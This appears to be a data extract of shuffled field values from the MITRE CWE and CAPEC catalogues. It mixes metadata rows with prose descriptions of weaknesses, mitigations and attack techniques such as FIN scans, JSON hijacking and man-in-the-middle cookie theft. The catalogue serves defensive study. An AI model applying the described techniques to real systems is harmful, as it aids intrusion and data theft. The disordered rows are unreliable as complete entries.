12409	23	An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.
5861	54	Low
5845	28	CWE Content Team
9798	103	Primary
11723	62	updated Relationships
7978	23	Catching overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.
6661	62	updated Relationships
20135	28	CWE Content Team
18613	69	Incomplete
5666	39	2009-07-27
10529	91	Implementation
15753	39	2008-09-08
20478	62	updated Description, Name
14668	35	MITRE
13605	39	2019-06-20
22650	79	Integrity
13880	69	Draft
24895	36	http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html
23192	63	DoS: Resource Consumption (Memory)
21008	62	updated Relationships, Other_Notes, Taxonomy_Mappings
15457	62	updated Time_of_Introduction
7105	92	Experiment
16422	23	An adversary is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Adversaries may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.
25403	103	Primary
18463	76	2017-08-04
23799	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
25005	58	Session ID's can be used to identify communicating parties in a web environment.                The expected number of seconds required to guess a valid session identifier is given by the equation: (2^B+1)/(2*A*S) Where: - B is the number of bits of entropy in the session identifier. - A is the number of guesses an attacker can try each second. - S is the number of valid session identifiers that are valid and available to be guessed at any given time. The number of bits of entropy in the session identifier is always less than the total number of bits in the session identifier. For example, if session identifiers were provided in ascending order, there would be close to zero bits of entropy in the session identifier no matter the identifier's length. Assuming that the session identifiers are being generated using a good source of random numbers, we will estimate the number of bits of entropy in a session identifier to be half the total number of bits in the session identifier. For realistic identifier lengths this is possible, though perhaps optimistic.
13323	54	Low
14836	35	MITRE
8693	39	2019-09-19
25091	28	CWE Content Team
12815	24	MITRE
21458	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
16817	102	ChildOf
9554	28	CWE Content Team
5694	35	MITRE
20269	28	CWE Content Team
23576	91	Implementation
23751	91	Implementation
18958	35	Cigital
19700	31	1000
19752	26	Implementation
7933	56	ChildOf
7876	92	Exploit
8413	102	ChildOf
7516	61	Stable
13849	35	MITRE
9031	81	Integrity
20222	88	Invokable Control Element with Variadic Parameters
9818	100	The MITRE Corporation
20844	69	Draft
9054	53	The MITRE Corporation
18854	26	Implementation
23390	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23705	39	2017-11-08
11557	26	Implementation
19135	35	MITRE
10475	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.                   Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.
5858	56	ChildOf
23337	39	2012-10-30
14140	74	1
12037	35	Cigital
24374	21	PLOVER
15057	35	MITRE
23968	43	Simple
6948	59	Updated Attack_Prerequisites, Description Summary
22343	79	Availability
13725	50	Detection of this type of attack can be done through heuristic analysis of behavioral anomalies (a la credit card fraud detection) which can be used to identify inhuman behavioral patterns. (e.g., spidering)
11446	51	2015-11-09
21457	35	MITRE
7919	63	Unexpected State
18352	62	updated Relationship_Notes, Relationships
22722	56	CanPrecede
6893	28	CWE Content Team
13202	62	updated Common_Consequences
21048	28	CWE Content Team
14742	62	updated Description
24710	63	DoS: Resource Consumption (CPU)
23985	28	CWE Content Team
17974	28	CWE Content Team
24696	35	MITRE
9729	42	Provide clear upper and lower bounds on the scale of any protocols designed.
9634	28	CWE Content Team
19619	39	2012-10-30
21229	44	SOAR Partial
19824	28	CWE Content Team
22737	85	164
10025	90	Language-Independent
10701	57	Indirect
23557	28	CWE Content Team
25141	39	2019-06-20
10949	89	Detailed
16616	28	CWE Content Team
15337	35	MITRE
11199	62	updated Potential_Mitigations
9017	28	CWE Content Team
9934	40	Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.
5985	21	PLOVER
11710	76	2019-04-04
19667	81	Confidentiality
20231	76	2015-11-09
6995	86	http://marc.info/?l=bugtraq&m=102088154213630&w=2
17494	51	2015-11-09
23305	103	Primary
13206	26	Architecture and Design
21734	44	SOAR Partial
8166	76	2019-09-30
11134	69	Incomplete
7812	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
6207	63	Gain Privileges or Assume Identity
14539	35	MITRE
7296	62	added/updated white box definitions
9834	69	Draft
21254	39	2017-11-08
21103	79	Integrity
19252	56	PeerOf
13922	74	1
24458	80	Understanding of low level programming languages or technologies can be very helpful. For example, when reverse engineering a binary file, an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here, an understanding networking protocols can provide insight into application details.
24817	26	Operation
24996	35	Cigital
11309	56	ChildOf
12978	50	Follow the principle of least privilege when assigning access rights to files.
14006	28	CWE Content Team
9109	81	Confidentiality
16206	28	CWE Content Team
7188	28	CWE Content Team
19540	39	2019-06-20
12827	62	updated Relationships
5703	40	The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).
21877	92	Exploit
18673	35	MITRE
14161	39	2010-02-16
11984	30	M. Bishop
7576	101	CAPEC Content Team
13849	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
22855	31	1000
17390	39	2011-06-01
13549	101	CAPEC Content Team
18721	35	MITRE
11685	79	Confidentiality
12239	91	Architecture and Design
6166	35	MITRE
17735	88	Missing Release of Resource after Effective Lifetime
20021	79	Confidentiality
19779	35	MITRE
19713	56	ChildOf
16491	39	2012-10-30
21297	47	Execute Unauthorized Commands
9231	45	Base
14230	91	Implementation
13590	102	ChildOf
14199	85	625
11476	49	2004
5732	35	MITRE
12137	81	Confidentiality
14414	39	2011-03-29
14254	55	CAPEC Content Team
11092	42	Perform extensive input validation for any privileged code that must be exposed to the user and reject anything that does not fit your strict requirements.
13644	39	2011-06-01
22232	39	2017-11-08
25337	31	1000
10735	31	699
16065	24	MITRE
7484	81	Integrity
8726	92	Experiment
15429	42	If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.
10677	62	updated Potential_Mitigations
13448	60	10
14006	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
17737	39	2011-06-01
24440	104	532
23467	39	2014-07-30
20962	39	2011-03-29
13237	28	CWE Content Team
13777	28	CWE Content Team
8482	88	Architecture with Number of Horizontal Layers Outside of Expected Range
22270	28	CWE Content Team
9252	56	ChildOf
6094	76	2017-08-04
23727	45	Base
23489	49	2010
13541	100	The MITRE Corporation
8144	91	Implementation
8386	42	Document and closely follow coding standards.
23392	35	MITRE
11178	21	PLOVER
21714	100	The MITRE Corporation
11480	102	ChildOf
10956	62	updated Applicable_Platforms, Description, Relationships, Taxonomy_Mappings
22513	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
20053	56	ChildOf
18428	34	This issue typically appears in rarely-tested code, since the "always-incorrect" nature will be detected as a bug during normal usage.
20806	35	MITRE
16845	66	Attacking Machine Learning with Adversarial Examples
23768	79	Authorization
13374	21	7 Pernicious Kingdoms
7496	35	MITRE
21142	53	The MITRE Corporation
15885	28	CWE Content Team
8901	39	2009-01-12
20688	39	2014-07-30
17827	63	Execute Unauthorized Code or Commands
6067	28	CWE Content Team
18142	63	Bypass Protection Mechanism
10622	40	The ability to observe and interact with a communication channel between communicating processes.
19555	28	CWE Content Team
14523	35	Cigital
19760	103	Primary
6218	40	The format string argument of the Syslog function can be tainted with user supplied data.
18229	63	Modify Application Data
16967	33	Michael D. Schroeder
6690	102	ChildOf
22635	28	CWE Content Team
22320	62	updated Applicable_Platforms, Causal_Nature
13790	63	Other
9346	50	Validate all untrusted data.
22213	35	MITRE
22526	35	MITRE
13812	31	1000
8511	103	Primary
15606	28	CWE Content Team
25163	39	2012-05-11
24157	39	2012-05-11
6990	103	Primary
10700	62	updated Related_Attack_Patterns
14508	104	1060
11192	39	2012-05-11
24611	28	CWE Content Team
22619	28	CWE Content Team
20361	77	Automated Dynamic Analysis
21499	31	1000
11746	59	Updated Related_Attack_Patterns, Skills_Required
7631	81	Confidentiality
14656	62	updated Description, Name
10222	39	2012-05-11
25171	51	2014-06-23
24572	54	Low
16309	80	Intelligence data on victim's purchasing habits.
6419	23	An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website. An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server. There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.
13976	67	Medium
8346	63	Read Application Data
22692	28	Sean Eidemiller
8526	57	Indirect
21646	23	The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.
14802	76	2017-08-04
21807	71	2010
18129	21	PLOVER
9070	28	CWE Content Team
23482	39	2019-01-03
6983	81	Integrity
23535	26	Implementation
15806	39	2009-07-27
8776	104	226
22150	85	648
6093	23	The software does not properly determine which state it is in, causing it to assume it is in state X when in fact it is in state Y, causing it to perform incorrect operations in a security-relevant manner.
24197	43	Simple
17004	88	Incorrectly Specified Destination in a Communication Channel
19712	24	MITRE
6909	39	2012-05-11
24156	62	updated Potential_Mitigations
13562	39	2017-11-08
24049	32	The Wikimedia Foundation, Inc
20938	43	Simple
15686	39	2019-06-20
22469	69	Incomplete
16733	92	Experiment
10206	72	The program could read data from the wrong file.
9218	62	updated Relationships
9359	28	CWE Content Team
20545	100	The MITRE Corporation
17443	62	updated Relationships
11699	62	updated Relationships, Taxonomy_Mappings
22121	28	CWE Content Team
9292	51	2014-06-23
23438	56	CanPrecede
16131	62	updated Common_Consequences
25131	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
6978	62	updated Relationships
24537	23	The code contains a class instance that calls the method or function to delete or destroy itself.
8426	28	CWE Content Team
24309	91	Implementation
14127	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/346.html
11970	66	The 2011 IDN Homograph Attack Mitigation Survey
6792	70	Wikipedia
20779	91	Implementation
19656	35	MITRE
19271	69	Incomplete
11826	56	ChildOf
6748	62	updated References
22403	23	The attacker may submit a malicious signed code from another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.
7043	39	2009-10-29
20434	28	CWE Content Team
7996	39	2014-07-30
10099	28	CWE Content Team
13586	28	Eric Dalci
11308	63	Other
5804	103	Primary
18606	28	CWE Content Team
14368	62	updated Common_Consequences
17623	63	Reduce Performance
23560	86	http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf
25281	35	MITRE
14972	25	Low
13589	62	updated Relationships, Taxonomy_Mappings
24116	72	If the temporary file can be read by the attacker, sensitive information may be in that file which could be revealed.
25398	102	ChildOf
9911	28	CWE Content Team
19087	103	Primary
9474	35	MITRE
11361	35	MITRE
23808	62	updated Description, Name
22043	46	Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path.
13451	35	MITRE
18022	79	Confidentiality
15875	23	An adversary engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.
12731	47	Other
12379	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
10559	62	updated Relationships
23361	62	updated Taxonomy_Mappings
17370	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
20686	39	2018-03-27
19891	69	Incomplete
9700	39	2009-10-29
11797	54	Low
21972	56	ChildOf
6948	101	CAPEC Content Team
9498	56	ChildOf
12145	54	Medium
5753	84	27
7897	76	2019-04-04
22199	39	2011-03-29
17374	60	10
7480	97	Probe System Files
17061	39	2012-10-30
9015	62	updated Description, Name, Observed_Examples, Relationships
18240	62	updated Common_Consequences
22843	31	699
10888	39	2010-02-16
7669	91	System Configuration
12224	62	updated Demonstrative_Examples, References
6471	50	Perform input validation for length of buffer inputs.
6733	101	CAPEC Content Team
9403	102	ChildOf
22004	94	By reading outside the boundary of the intended buffer, the adversary is potentially able to see any data that is stored on the disk. This could include secret keys, personal information, and sensitive files.
9959	23	An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.
8891	104	170
17769	22	05
12612	97	Smudge Attack
20497	39	2012-05-11
19536	59	Updated Consequences
6170	100	The MITRE Corporation
16509	39	2008-07-01
18577	47	Hide Activities
16102	35	MITRE
5992	28	CWE Content Team
19223	71	2010
11858	43	Simple
22669	24	MITRE
8800	47	Read Data
20618	50	Do not allow override of global variables and do Not Trust Global Variables.                If the register_globals option is enabled, PHP will create global variables for each GET, POST, and cookie variable included in the HTTP request. This means that a malicious user may be able to set variables unexpectedly. For instance make sure that the server setting for PHP does not expose global variables.
15309	36	http://www.faqs.org/rfcs/rfc950.html
22646	91	Implementation
24296	39	2012-10-30
17753	39	2010-04-05
14191	26	Operation
6001	40	The target application must allow the user to send email to some recipient, to specify the content at least one header field in the message, and must fail to sanitize against the injection of command separators.
8137	35	Cigital
8259	28	CWE Content Team
14991	51	2014-06-23
20343	35	MITRE
10465	39	2009-07-27
16164	72	A user can be given or gain access rights of another user. This can give the user unauthorized access to sensitive information including the access information of another user.
22723	56	ChildOf
19860	46	This flaw represents a common problem in software development, in which not all possible values for a variable are considered or handled by a given process. Because of this, further decisions are made based on poor information, and cascading failure results. This cascading failure may result in any number of security issues, and constitutes a significant failure in the system.
12494	31	699
20470	45	Class
13084	28	CWE Content Team
15072	62	updated Demonstrative_Examples
6279	66	The info leak era on software exploitation
23840	47	Execute Unauthorized Commands
16528	85	607
19872	97	XSS Targeting URI Placeholders
6643	101	CAPEC Content Team
13901	76	2017-08-04
20959	101	CAPEC Content Team
12586	31	699
6857	28	CWE Content Team
21656	39	2008-07-01
11154	35	MITRE
12265	62	updated Relationships
14675	50	Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)
14940	102	ChildOf
17179	35	MITRE
10632	62	updated Demonstrative_Examples
21436	31	699
23154	85	588
15657	62	updated Relationships
12092	35	MITRE
17543	35	MITRE
20996	28	Eric Dalci
16115	39	2009-12-28
16590	63	Execute Unauthorized Code or Commands
12849	36	http://www.unicode.org/versions/corrigendum1.html
17321	50	Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.
14939	100	The MITRE Corporation
21530	103	Primary
19537	76	2017-08-04
24976	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
24804	58	Historically, there was a bug in the Windows operating system that caused a blue screen of death. Even after that issue was fixed DOS device names continue to be a factor.
20081	23	The software provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.
15662	81	Other
12930	59	Updated Attack_Motivation-Consequences, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
15325	23	The software does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised.
20981	39	2009-01-12
24186	47	Execute Unauthorized Commands
6747	103	Primary
16034	39	2008-11-24
9718	62	updated Detection_Factors, Potential_Mitigations
6511	23	The software's user interface does not warn the user before undertaking an unsafe action on behalf of that user. This makes it easier for attackers to trick users into inflicting damage to their system.
7438	62	updated Related_Attack_Patterns
16040	26	Implementation
13184	55	CAPEC Content Team
12161	62	updated Relationships, Taxonomy_Mappings
14323	86	http://www.insecure.org/stf/secnet_ids/secnet_ids.pdf
13165	39	2008-11-24
17290	103	Primary
13793	48	09
19881	35	MITRE
18091	39	2008-07-01
18970	86	http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html
24643	61	Stable
6936	78	High
6435	53	The MITRE Corporation
12120	89	Standard
11741	62	updated Relationships
17675	35	MITRE
19781	35	MITRE
9981	91	Implementation
14825	63	Other
24413	55	CAPEC Content Team
11197	35	MITRE
12827	28	CWE Content Team
23074	91	Architecture and Design
12464	28	CWE Content Team
9141	31	699
6594	81	Availability
15196	50	Make sure to install the latest vendor security patches available for the web server.
22311	45	Base
9523	50	Design: Utilize two factor authentication to increase authentication assurance.
15945	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
11988	81	Integrity
22834	28	CWE Content Team
10089	45	Base
20658	103	Primary
18096	43	Simple
20676	96	2010-01-15
20949	62	updated Relationships, Other_Notes, Taxonomy_Mappings
17371	62	updated Description, Relationships, Taxonomy_Mappings
10472	28	Eric Dalci
16072	39	2009-01-12
16354	39	2017-11-08
18390	78	Low
13815	91	Operation
24244	35	MITRE
15807	39	2015-12-07
21908	45	Variant
18219	31	1000
10940	102	ChildOf
21886	35	MITRE
22604	81	Confidentiality
14488	76	2019-09-30
25114	21	CLASP
7653	35	MITRE
16509	28	Eric Dalci
22536	89	Detailed
8996	28	CWE Content Team
12464	35	MITRE
20541	56	ChildOf
22756	77	Automated Dynamic Analysis
18434	62	updated Relationships
9757	39	2012-05-11
7274	35	Cigital
15252	28	CWE Content Team
23229	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   If possible, choose a language or compiler that performs automatic bounds checking.
13482	26	Implementation
17790	67	High
17607	62	updated Common_Consequences
6756	62	updated Relationships, Taxonomy_Mappings
22169	95	[Survey the application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.
9158	35	MITRE
22382	49	2005
20951	24	MITRE
13623	39	2009-10-29
14664	86	http://blogs.sans.org/appsecstreetfighter/2010/03/15/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/
12830	51	2014-06-23
20932	103	Primary
13653	54	High
14794	61	Draft
23029	69	Incomplete
7746	62	updated Common_Consequences, Potential_Mitigations, References
17778	79	Authorization
5957	35	MITRE
6201	95	The adversary identifies a buffer to target. Buffer regions are either allotted on the stack or the heap, and the exact nature of attack would vary depending on the location of the buffer
23817	104	147
22222	28	CWE Content Team
15314	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
12708	28	CWE Content Team
22783	62	updated Demonstrative_Examples
6629	28	CWE Content Team
12931	79	Confidentiality
15387	35	MITRE
11876	101	CAPEC Content Team
12015	62	Suggested OWASP Top Ten 2004 mapping
16066	28	CWE Content Team
6273	35	MITRE
20973	28	CWE Content Team
22693	56	ChildOf
19726	35	MITRE
16314	45	Variant
10045	28	CWE Content Team
16821	69	Draft
11222	39	2012-10-30
18934	48	02
12374	31	1000
14899	59	Updated Examples-Instances, Typical_Likelihood_of_Exploit
10474	39	2019-01-03
22965	53	The MITRE Corporation
11037	28	CWE Content Team
11666	45	Class
23509	62	updated Common_Consequences
6224	62	updated Potential_Mitigations
21487	69	Draft
25439	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].
17212	81	Availability
24234	23	An attacker embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).
9027	61	Stable
10865	63	Bypass Protection Mechanism
10055	62	updated Applicable_Platforms
25039	28	Eric Dalci
11108	35	MITRE
24436	73	Certain tools like Mimikatz can extract local tickets and save them to memory/disk.
22720	25	Medium
12294	35	MITRE
22343	79	Confidentiality
20740	62	updated Relationships, Taxonomy_Mappings
10917	42	Always verify the integrity of the software that is being installed.
23629	28	CWE Content Team
18027	77	Automated Static Analysis - Binary or Bytecode
23088	47	Gain Privileges
5685	56	Requires
20470	69	Draft
11778	76	2019-04-04
19710	55	CAPEC Content Team
10482	45	Base
10428	62	updated Potential_Mitigations
9417	69	Incomplete
23815	35	MITRE
12640	39	2009-07-27
14309	28	CWE Content Team
23352	35	Cigital
19764	86	http://www.ibm.com/developerworks/library/l-sprace.html
8063	57	Primary
15080	28	CWE Content Team
7294	81	Integrity
14328	77	Manual Static Analysis - Source Code
19178	26	Implementation
6179	24	MITRE
22369	28	Eric Dalci
9415	28	CWE Content Team
24596	77	Black Box
21180	62	updated Description, Name, Theoretical_Notes
20913	56	ChildOf
23221	91	Architecture and Design
11693	35	Cigital
9518	39	2012-05-11
10871	63	Unexpected State
12002	35	MITRE
13889	31	699
24557	28	CWE Content Team
24009	74	1
25175	31	1000
7713	69	Incomplete
7685	56	ChildOf
17821	51	2014-06-23
22452	42	Ensure that you account for all possible return values from the function.
25387	78	Very High
16297	102	ChildOf
18313	39	2010-04-05
12065	43	Simple
16008	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
14821	35	MITRE
6942	28	CWE Content Team
19693	91	Architecture and Design
20666	62	updated Relationships, Type
8889	103	Primary
20396	43	Simple
16900	63	Alter Execution Logic
17541	61	Stable
12288	61	Draft
14543	28	CWE Content Team
10974	90	Java
11523	39	2009-10-29
20415	35	MITRE
8739	23	An attacker leverages a man in the middle attack in order to bypass the same origin policy protection in the victim's browser. This active man in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS. For instance, the victim may be checking flight or weather information. When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The same origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active man in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive functionality. Any persistent cookies that the victim has in his or her browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality. When the site with sensitive functionality responds back to the victim's request, an active man in the middle attacker intercepts these responses, injects his or her own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can essentially be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires. The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks). An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well.
11476	66	Measuring a System's Attack Surface
15976	35	MITRE
6475	49	1996
19716	23	An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to its relative speed in comparison with other types of scans, the major advantage a TCP FIN Scan is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link. FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected.
20028	39	2014-07-30
16997	42	Follow the principle of failing securely when an error occurs. The system should enter a state where it is not vulnerable and will not display sensitive error messages to a potential attacker.
18631	28	CWE Content Team
20400	30	J. Cappos
17292	90	Language-Independent
15399	60	24
20400	30	C. Barsan
23896	56	ChildOf
8248	93	High
11316	90	Language-Independent
14892	62	updated Name
18835	31	1000
22759	35	MITRE
23052	28	CWE Content Team
14353	28	CWE Content Team
6764	91	Architecture and Design
14262	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
10965	28	CWE Content Team
9817	21	PLOVER
24031	39	2011-06-27
16251	40	Access to the manufacturer's documentation.
7502	91	Implementation
15936	35	MITRE
25258	56	ChildOf
9276	63	Bypass Protection Mechanism
15888	28	CWE Content Team
16848	28	CWE Content Team
23901	35	MITRE
17979	62	updated Related_Attack_Patterns
23811	45	Variant
11721	90	Language-Independent
8703	35	MITRE
7831	62	updated Description, Other_Notes
18396	77	Automated Static Analysis - Source Code
12201	39	2011-06-01
15905	35	MITRE
10617	85	620
6958	35	MITRE
25191	35	MITRE
12662	103	Primary
25236	101	CAPEC Content Team
12086	61	Draft
13132	91	Operation
22759	28	CWE Content Team
6796	88	Path Equivalence: 'filename.' (Trailing Dot)
16014	42	Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.                   Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.                   Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
10634	62	updated Applicable_Platforms, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships
12687	62	updated Common_Consequences
7201	95	[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.
25347	30	Juliano Rizzo
13613	28	CWE Content Team
6197	24	MITRE
19750	85	39
14998	59	Updated Related_Weaknesses
17540	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
24736	93	Defense in Depth
24230	28	CWE Content Team
9177	35	MITRE
15487	59	Updated Attacker_Skills_or_Knowledge_Required
14757	62	updated Modes_of_Introduction, References, Relationships
9321	35	MITRE
8822	62	updated Related_Attack_Patterns
10898	28	CWE Content Team
16195	35	MITRE
12892	44	High
12017	39	2010-06-21
23685	103	Primary
16873	74	3
8939	81	Confidentiality
23056	62	updated Common_Consequences
22829	63	Other
9576	85	481
17793	77	Automated Static Analysis - Source Code
6812	31	699
16316	26	Implementation
25069	26	Architecture and Design
7102	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
17269	62	updated Demonstrative_Examples, Observed_Examples, Relationships
17474	28	CWE Content Team
22713	31	1000
8920	86	http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-11/0257.html
